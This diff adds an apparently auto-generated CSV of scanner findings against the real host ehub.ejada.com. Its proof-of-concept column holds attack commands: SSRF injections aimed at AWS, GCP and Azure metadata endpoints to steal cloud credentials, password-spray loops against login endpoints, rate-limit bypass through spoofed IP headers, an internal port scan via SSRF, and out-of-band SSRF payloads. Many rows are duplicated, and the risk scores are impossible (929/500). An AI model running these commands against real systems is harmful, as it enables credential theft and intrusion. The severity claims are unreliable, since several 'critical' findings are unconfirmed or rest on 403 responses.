@@ -1,0 +1,185 @@
+Target,ID,Title,Severity,CVSS,CWE,Category,Description,PoC
+ehub.ejada.com,FULL-CHAIN-POC,"Full chain PoC — 5 findings chained, 2 attack combos identified",CRITICAL,10.0,CWE-1035,Exploit Chain,"Top-5 findings exploit chain for ehub.ejada.com:
+Step 1: [HIGH] Critical Security Headers Missing
+  ","curl -sI 'https://ehub.ejada.com/'
+curl -sI 'https://ehub.ejada.com/' | grep -i "
+ehub.ejada.com,ADV-EXPLOIT-CHAIN,Advanced exploit chain: SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover,CRITICAL,10.0,CWE-1035,Exploit Chain,"Attack chains synthesised for ehub.ejada.com (2 chains, 49 findings):
+
+[CRITICAL] SSRF → Cloud Metad","Step 1: curl -sI 'https://ehub.ejada.com/'
+curl -sI 'https://ehub.ejada.com/' | "
+ehub.ejada.com,AZURE-IMDS-V1-METADATA-URL,SSRF → Azure IMDS v1-metadata Chain via ?url,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-metadata) to retrieve managed identity ac","# Step 1 — Verify SSRF via OOB:
+curl -sk 'https://ehub.ejada.com?url=http://YOUR"
+ehub.ejada.com,AZURE-IMDS-V1-IDENTITY-URL,SSRF → Azure IMDS v1-identity Chain via ?url,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-identity) to retrieve managed identity ac","# Step 1 — Verify SSRF via OOB:
+curl -sk 'https://ehub.ejada.com?url=http://YOUR"
+ehub.ejada.com,AZURE-IMDS-V1-SUBSCRIPTIO-URL,SSRF → Azure IMDS v1-subscription Chain via ?url,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed via ?url, inject Azure IMDS endpoint (v1-subscription) to retrieve managed identit","# Step 1 — Verify SSRF via OOB:
+curl -sk 'https://ehub.ejada.com?url=http://YOUR"
+ehub.ejada.com,AZURE-IMDS-V2-IDENTITY-URL,SSRF → Azure IMDS v2-identity Chain via ?url,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed via ?url, inject Azure IMDS endpoint (v2-identity) to retrieve managed identity ac","# Step 1 — Verify SSRF via OOB:
+curl -sk 'https://ehub.ejada.com?url=http://YOUR"
+ehub.ejada.com,AWS-IMDS-V1-CREDS,SSRF → AWS IMDS v1-creds — IAM Credential Theft Chain,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed, inject AWS IMDS endpoint (v1-creds) to retrieve IAM role credentials (AccessKeyId","# IMDSv1 (no token required):
+curl -sk 'https://ehub.ejada.com?url=http%3A//169."
+ehub.ejada.com,AWS-IMDS-V1-ROLE,SSRF → AWS IMDS v1-role — IAM Credential Theft Chain,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed, inject AWS IMDS endpoint (v1-role) to retrieve IAM role credentials (AccessKeyId,","# IMDSv1 (no token required):
+curl -sk 'https://ehub.ejada.com?url=http%3A//169."
+ehub.ejada.com,AWS-IMDS-V2-TOKEN,SSRF → AWS IMDS v2-token — IAM Credential Theft Chain,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed, inject AWS IMDS endpoint (v2-token) to retrieve IAM role credentials (AccessKeyId","# IMDSv1 (no token required):
+curl -sk 'https://ehub.ejada.com?url=http%3A//169."
+ehub.ejada.com,GCP-META-SA-TOKEN,SSRF → GCP Metadata sa-token — Service Account Token Chain,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed, inject GCP metadata endpoint (sa-token) to retrieve OAuth2 access_token for the i",curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMe
+ehub.ejada.com,GCP-META-SA-EMAIL,SSRF → GCP Metadata sa-email — Service Account Token Chain,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed, inject GCP metadata endpoint (sa-email) to retrieve OAuth2 access_token for the i",curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMe
+ehub.ejada.com,GCP-META-PROJECT-ID,SSRF → GCP Metadata project-id — Service Account Token Chain,CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,"If SSRF confirmed, inject GCP metadata endpoint (project-id) to retrieve OAuth2 access_token for the",curl -sk 'https://ehub.ejada.com?url=http%3A//metadata.google.internal/computeMe
+ehub.ejada.com,CHAIN-CLOUD-TAKEOVER,[EXPLOIT CHAIN] Cloud Account Takeover via SSRF,CRITICAL,9.9,CWE-693,Exploit Chain,"[APPLICABLE TO THIS TARGET] Complete exploit narrative: Cloud Account Takeover via SSRF
+
+Attack step",# See attack steps above — each step must be verified manually
+ehub.ejada.com,SCORECARD-001,Attack Surface Scorecard — Risk Score 539/500 (100%) — CRITICAL,CRITICAL,0.0,CWE-693,Risk Scorecard,"Attack Surface Scorecard — ehub.ejada.com
+══════════════════════════════════════════════════
+Risk Sc",# This is a summary scorecard — see individual findings for PoC commands
+ehub.ejada.com,SCORECARD-001,Attack Surface Scorecard — Risk Score 564/500 (100%) — CRITICAL,CRITICAL,0.0,CWE-693,Risk Scorecard,"Attack Surface Scorecard — ehub.ejada.com
+══════════════════════════════════════════════════
+Risk Sc",# This is a summary scorecard — see individual findings for PoC commands
+ehub.ejada.com,LATERAL-MOVE-MAP-001,Lateral Movement Attack Path Map,CRITICAL,0.0,CWE-284,Lateral Movement,Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. In,"# Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379"
+ehub.ejada.com,LATERAL-MOVE-MAP-001,Lateral Movement Attack Path Map,CRITICAL,0.0,CWE-284,Lateral Movement,Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. In,"# Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379"
+ehub.ejada.com,LATERAL-MOVE-MAP-001,Lateral Movement Attack Path Map,CRITICAL,0.0,CWE-284,Lateral Movement,Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. In,"# Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379"
+ehub.ejada.com,LATERAL-MOVE-MAP-001,Lateral Movement Attack Path Map,CRITICAL,0.0,CWE-284,Lateral Movement,Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. In,"# Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379"
+ehub.ejada.com,SCORECARD-001,Attack Surface Scorecard — Risk Score 929/500 (100%) — CRITICAL,CRITICAL,0.0,CWE-693,Risk Scorecard,"Attack Surface Scorecard — ehub.ejada.com
+══════════════════════════════════════════════════
+Risk Sc",# This is a summary scorecard — see individual findings for PoC commands
+ehub.ejada.com,CLOUD-META-PIVOT-CHAIN-001,Cloud Metadata Pivot Chain — Built from 17 SSRF finding(s),CRITICAL,9.9,CWE-918,SSRF → Cloud Pivot,Complete cloud metadata pivot chains generated from 17 confirmed/suspected SSRF finding(s). Each cha,# See chain steps above — replace SSRF parameter with metadata URLs
+ehub.ejada.com,F-HDR-001,Critical Security Headers Missing,HIGH,5.4,CWE-693,Security Headers,Header score 0/100 — multiple critical headers absent.,curl -sI 'https://ehub.ejada.com/'
+ehub.ejada.com,CHAIN-JENKINS-RCE,[EXPLOIT CHAIN] Jenkins Groovy RCE → Lateral Movement,HIGH,10.0,CWE-693,Exploit Chain,[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Jenkins Groovy RCE → Lateral Moveme,# See attack steps above — each step must be verified manually
+ehub.ejada.com,CHAIN-LFI-RCE,[EXPLOIT CHAIN] LFI → Log Poison → RCE,HIGH,9.8,CWE-693,Exploit Chain,"[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: LFI → Log Poison → RCE
+
+Attack step",# See attack steps above — each step must be verified manually
+ehub.ejada.com,CHAIN-AUTH-BYPASS-ADMIN,[EXPLOIT CHAIN] Auth Bypass → Admin Takeover → Data Exfil,HIGH,9.6,CWE-693,Exploit Chain,[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Auth Bypass → Admin Takeover → Data,# See attack steps above — each step must be verified manually
+ehub.ejada.com,CHAIN-SUPPLY-CHAIN-SAST,[EXPLOIT CHAIN] Supply Chain → Internal Package Confusion → RCE,HIGH,9.3,CWE-693,Exploit Chain,[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Supply Chain → Internal Package Con,# See attack steps above — each step must be verified manually
+ehub.ejada.com,CREDSTUFF-LOGIN,Credential Stuffing Surface — No Rate Limit at /login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /login has no apparent rate limiting or lockout. Credential stuffing surface: 10 commo,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_LOGIN,Credential Stuffing Surface — No Rate Limit at /api/login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 c,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_AUTH,Credential Stuffing Surface — No Rate Limit at /api/auth,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 co,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_V1_LOGIN,Credential Stuffing Surface — No Rate Limit at /api/v1/login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 1,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_V2_AUTH,Credential Stuffing Surface — No Rate Limit at /api/v2/auth,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_SIGNIN,Credential Stuffing Surface — No Rate Limit at /api/signin,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 ,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-AUTH_TOKEN,Credential Stuffing Surface — No Rate Limit at /auth/token,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 ,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_SESSIONS,Credential Stuffing Surface — No Rate Limit at /api/sessions,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 1,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-LOGIN,Credential Stuffing Surface — No Rate Limit at /login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /login has no apparent rate limiting or lockout. Credential stuffing surface: 10 commo,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_LOGIN,Credential Stuffing Surface — No Rate Limit at /api/login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 c,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_AUTH,Credential Stuffing Surface — No Rate Limit at /api/auth,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 co,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_V1_LOGIN,Credential Stuffing Surface — No Rate Limit at /api/v1/login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 1,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_V2_AUTH,Credential Stuffing Surface — No Rate Limit at /api/v2/auth,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_SIGNIN,Credential Stuffing Surface — No Rate Limit at /api/signin,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 ,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-AUTH_TOKEN,Credential Stuffing Surface — No Rate Limit at /auth/token,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 ,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_SESSIONS,Credential Stuffing Surface — No Rate Limit at /api/sessions,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 1,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-LOGIN,Credential Stuffing Surface — No Rate Limit at /login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /login has no apparent rate limiting or lockout. Credential stuffing surface: 10 commo,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_LOGIN,Credential Stuffing Surface — No Rate Limit at /api/login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 c,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_AUTH,Credential Stuffing Surface — No Rate Limit at /api/auth,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 co,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_V1_LOGIN,Credential Stuffing Surface — No Rate Limit at /api/v1/login,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 1,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_V2_AUTH,Credential Stuffing Surface — No Rate Limit at /api/v2/auth,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_SIGNIN,Credential Stuffing Surface — No Rate Limit at /api/signin,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 ,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-AUTH_TOKEN,Credential Stuffing Surface — No Rate Limit at /auth/token,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 ,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,CREDSTUFF-API_SESSIONS,Credential Stuffing Surface — No Rate Limit at /api/sessions,HIGH,7.5,CWE-307,Auth / Credential Stuffing,Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 1,"# Password spray (authorized testing only):
+for pass in Password1! Welcome1! Sum"
+ehub.ejada.com,RATELIMIT-BYPASS-IPHDR-API_LOGIN,Rate Limit Bypass via IP Header Rotation at /api/login,HIGH,7.5,CWE-307,Rate Limiting,Sent 9 requests with rotating IP spoof headers to /api/login. No HTTP 429 received (codes: {403}). R,"for i in $(seq 1 50); do
+  curl -sk -X POST 'https://ehub.ejada.com/api/login' -"
+ehub.ejada.com,RATELIMIT-BYPASS-IPHDR-API_AUTH,Rate Limit Bypass via IP Header Rotation at /api/auth,HIGH,7.5,CWE-307,Rate Limiting,Sent 9 requests with rotating IP spoof headers to /api/auth. No HTTP 429 received (codes: {403}). Ra,"for i in $(seq 1 50); do
+  curl -sk -X POST 'https://ehub.ejada.com/api/auth' -H"
+ehub.ejada.com,RATELIMIT-BYPASS-IPHDR-LOGIN,Rate Limit Bypass via IP Header Rotation at /login,HIGH,7.5,CWE-307,Rate Limiting,Sent 9 requests with rotating IP spoof headers to /login. No HTTP 429 received (codes: {403}). Rate ,"for i in $(seq 1 50); do
+  curl -sk -X POST 'https://ehub.ejada.com/login' -H 'X"
+ehub.ejada.com,RATELIMIT-BYPASS-IPHDR-AUTH,Rate Limit Bypass via IP Header Rotation at /auth,HIGH,7.5,CWE-307,Rate Limiting,Sent 9 requests with rotating IP spoof headers to /auth. No HTTP 429 received (codes: {403}). Rate l,"for i in $(seq 1 50); do
+  curl -sk -X POST 'https://ehub.ejada.com/auth' -H 'X-"
+ehub.ejada.com,F-CJ-001,Clickjacking Vulnerability,MEDIUM,5.4,CWE-1021,Clickjacking,Page can be embedded in an iframe — clickjacking possible.,curl -sI 'https://ehub.ejada.com/' | grep -i 'x-frame\|frame-ancestors'
+ehub.ejada.com,DANGLE-DNS-BLOG,Dangling DNS — blog.ejada.com does not resolve,MEDIUM,5.4,CWE-350,Subdomain Takeover,"Subdomain blog.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeove",dig blog.ejada.com +short
+ehub.ejada.com,DANGLE-DNS-HELP,Dangling DNS — help.ejada.com does not resolve,MEDIUM,5.4,CWE-350,Subdomain Takeover,"Subdomain help.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeove",dig help.ejada.com +short
+ehub.ejada.com,DANGLE-DNS-SUPPORT,Dangling DNS — support.ejada.com does not resolve,MEDIUM,5.4,CWE-350,Subdomain Takeover,"Subdomain support.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, take",dig support.ejada.com +short
+ehub.ejada.com,DANGLE-DNS-DEV,Dangling DNS — dev.ejada.com does not resolve,MEDIUM,5.4,CWE-350,Subdomain Takeover,"Subdomain dev.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover",dig dev.ejada.com +short
+ehub.ejada.com,DANGLE-DNS-STAGING,Dangling DNS — staging.ejada.com does not resolve,MEDIUM,5.4,CWE-350,Subdomain Takeover,"Subdomain staging.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, take",dig staging.ejada.com +short
+ehub.ejada.com,DANGLE-DNS-API,Dangling DNS — api.ejada.com does not resolve,MEDIUM,5.4,CWE-350,Subdomain Takeover,"Subdomain api.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeover",dig api.ejada.com +short
+ehub.ejada.com,DANGLE-DNS-BETA,Dangling DNS — beta.ejada.com does not resolve,MEDIUM,5.4,CWE-350,Subdomain Takeover,"Subdomain beta.ejada.com has no DNS record. If a CNAME chain points to an unclaimed service, takeove",dig beta.ejada.com +short
+ehub.ejada.com,HTTP2-RAPID-RESET,HTTP/2 enabled — assess CVE-2023-44487 (Rapid Reset) exposure,MEDIUM,7.5,CWE-400,DoS,Server supports HTTP/2. Verify it is patched against CVE-2023-44487 (HTTP/2 Rapid Reset DoS). Vulner,curl -sk --http2 -I https://ehub.ejada.com/
+ehub.ejada.com,DEBUG-EP-_DEBUG_PPROF,Debug/profiler endpoint accessible: /debug/pprof,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/debug/pprof returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/debug/pprof
+ehub.ejada.com,DEBUG-EP-_DEBUG_VARS,Debug/profiler endpoint accessible: /debug/vars,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/debug/vars returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/debug/vars
+ehub.ejada.com,DEBUG-EP-_DEBUG_REQUESTS,Debug/profiler endpoint accessible: /debug/requests,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/debug/requests returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/debug/requests
+ehub.ejada.com,DEBUG-EP-___DEBUG___,Debug/profiler endpoint accessible: /__debug__/,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/__debug__/ returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/__debug__/
+ehub.ejada.com,DEBUG-EP-__DEBUG_,Debug/profiler endpoint accessible: /_debug/,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/_debug/ returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/_debug/
+ehub.ejada.com,DEBUG-EP-__PROFILE,Debug/profiler endpoint accessible: /_profile,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/_profile returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/_profile
+ehub.ejada.com,DEBUG-EP-_METRICS,Debug/profiler endpoint accessible: /metrics,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/metrics returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/metrics
+ehub.ejada.com,DEBUG-EP-_METRICS_PROMETHEUS,Debug/profiler endpoint accessible: /metrics/prometheus,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/metrics/prometheus returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/metrics/prometheus
+ehub.ejada.com,DEBUG-EP-_JOLOKIA,Debug/profiler endpoint accessible: /jolokia,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/jolokia returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/jolokia
+ehub.ejada.com,DEBUG-EP-_JOLOKIA_READ,Debug/profiler endpoint accessible: /jolokia/read,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/jolokia/read returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/jolokia/read
+ehub.ejada.com,DEBUG-EP-__AH_ADMIN,Debug/profiler endpoint accessible: /_ah/admin,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/_ah/admin returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/_ah/admin
+ehub.ejada.com,DEBUG-EP-__AH_MAIL,Debug/profiler endpoint accessible: /_ah/mail,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/_ah/mail returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/_ah/mail
+ehub.ejada.com,DEBUG-EP-__AH_WARMUP,Debug/profiler endpoint accessible: /_ah/warmup,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/_ah/warmup returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/_ah/warmup
+ehub.ejada.com,DEBUG-EP-_DRUID_INDEX.HTML,Debug/profiler endpoint accessible: /druid/index.html,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/druid/index.html returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/druid/index.html
+ehub.ejada.com,DEBUG-EP-_KIBANA,Debug/profiler endpoint accessible: /kibana,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/kibana returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/kibana
+ehub.ejada.com,DEBUG-EP-_SOLR_ADMIN,Debug/profiler endpoint accessible: /solr/admin,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/solr/admin returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/solr/admin
+ehub.ejada.com,DEBUG-EP-_SOLR_ADMIN_INFO_SYS,Debug/profiler endpoint accessible: /solr/admin/info/system,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/solr/admin/info/system returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/solr/admin/info/system
+ehub.ejada.com,DEBUG-EP-___ADMIN__,Debug/profiler endpoint accessible: /__admin__,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/__admin__ returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/__admin__
+ehub.ejada.com,DEBUG-EP-___STATUS__,Debug/profiler endpoint accessible: /__status__,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/__status__ returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/__status__
+ehub.ejada.com,DEBUG-EP-___HEALTH__,Debug/profiler endpoint accessible: /__health__,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/__health__ returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/__health__
+ehub.ejada.com,DEBUG-EP-_TELESCOPE,Debug/profiler endpoint accessible: /telescope,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/telescope returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/telescope
+ehub.ejada.com,DEBUG-EP-_TELESCOPE_REQUESTS,Debug/profiler endpoint accessible: /telescope/requests,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/telescope/requests returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/telescope/requests
+ehub.ejada.com,DEBUG-EP-_HORIZON,Debug/profiler endpoint accessible: /horizon,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/horizon returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/horizon
+ehub.ejada.com,DEBUG-EP-_HORIZON_API_STATS,Debug/profiler endpoint accessible: /horizon/api/stats,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/horizon/api/stats returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/horizon/api/stats
+ehub.ejada.com,DEBUG-EP-__PROFILER_PHPSTORM,Debug/profiler endpoint accessible: /_profiler/phpstorm,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/_profiler/phpstorm returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/_profiler/phpstorm
+ehub.ejada.com,DEBUG-EP-_?XDEBUG_SESSION_STA,Debug/profiler endpoint accessible: /?XDEBUG_SESSION_START=1,MEDIUM,4.3,CWE-489,Information Disclosure,https://ehub.ejada.com/?XDEBUG_SESSION_START=1 returned 403. Content: Host not in allowlist,curl -sk https://ehub.ejada.com/?XDEBUG_SESSION_START=1
+ehub.ejada.com,GQL-CIRCULAR-CIRCULAR,GraphQL circular payload accepted (0.0s) — DoS surface,MEDIUM,5.9,CWE-674,GraphQL,GraphQL endpoint /graphql processed circular payload in 0.0s without depth/complexity rejection. Cir,curl -sk -X POST https://ehub.ejada.com/graphql -H 'Content-Type: application/js
+ehub.ejada.com,GQL-CIRCULAR-CIRCULAR,GraphQL circular payload accepted (0.0s) — DoS surface,MEDIUM,5.9,CWE-674,GraphQL,GraphQL endpoint /api/graphql processed circular payload in 0.0s without depth/complexity rejection.,curl -sk -X POST https://ehub.ejada.com/api/graphql -H 'Content-Type: applicatio
+ehub.ejada.com,GQL-CIRCULAR-CIRCULAR,GraphQL circular payload accepted (0.0s) — DoS surface,MEDIUM,5.9,CWE-674,GraphQL,GraphQL endpoint /gql processed circular payload in 0.0s without depth/complexity rejection. Circula,curl -sk -X POST https://ehub.ejada.com/gql -H 'Content-Type: application/json' 
+ehub.ejada.com,GQL-CIRCULAR-CIRCULAR,GraphQL circular payload accepted (0.0s) — DoS surface,MEDIUM,5.9,CWE-674,GraphQL,GraphQL endpoint /query processed circular payload in 0.0s without depth/complexity rejection. Circu,curl -sk -X POST https://ehub.ejada.com/query -H 'Content-Type: application/json
+ehub.ejada.com,DNS-REBIND-SURFACE,DNS rebinding attack surface assessment for ehub.ejada.com,MEDIUM,5.4,CWE-346,DNS,"Host ehub.ejada.com resolves to 34.111.193.103 (public).
+CORS Origin: null → ACAO: ''
+DNS rebinding:","# DNS rebinding PoC (use singularity or rebind.network):
+# 1. Register attacker "
+ehub.ejada.com,CF-ORIGIN-BYPASS-001,Cloudflare/CDN Origin Bypass Attack Surface,MEDIUM,5.3,CWE-441,CDN Bypass,Multiple indicators for Cloudflare/CDN origin IP bypass at ehub.ejada.com. Direct-to-origin connecti,"# Test direct connection with Host header:
+curl -sk --resolve 'ehub.ejada.com:34"
+ehub.ejada.com,F-BSSRF-001,Blind SSRF Attack Surface — OOB Payloads Generated,INFO,0.0,CWE-918,SSRF,Generated 10 OOB SSRF payloads for manual verification.,curl -sk 'https://ehub.ejada.com?proxy=http%3A//proxy.ehub.ejada.com.YOUR_OOB_DO
+ehub.ejada.com,F-VDP-001,No security.txt / Vulnerability Disclosure Policy,INFO,0.0,CWE-200,VDP,No security.txt file found. Researchers have no official contact for vulnerability reports.,curl -sk 'https://ehub.ejada.com/.well-known/security.txt'
